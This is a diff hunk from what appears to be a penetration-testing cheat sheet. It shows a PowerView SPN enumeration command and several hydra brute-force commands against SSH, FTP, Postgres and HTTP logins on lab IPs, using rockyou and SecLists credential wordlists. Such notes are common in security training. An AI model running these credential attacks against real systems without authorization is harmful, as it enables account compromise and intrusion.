@@ -567,7 +567,7 @@ get-domainuser -spn -credential $Cred
 hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.50.202
 hydra -L /usr/share/seclists/Passwords/UserPassCombo-Jay.txt -P /usr/share/seclists/Passwords/UserPassCombo-Jay.txt ftp://192.168.50.202 -f
-hydra  -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://192.168.242.56
+hydra  -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://192.168.175.47 -t 4
 
 # hydra for HTTP
 hydra -l admin -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.172.61 http-get /login -f
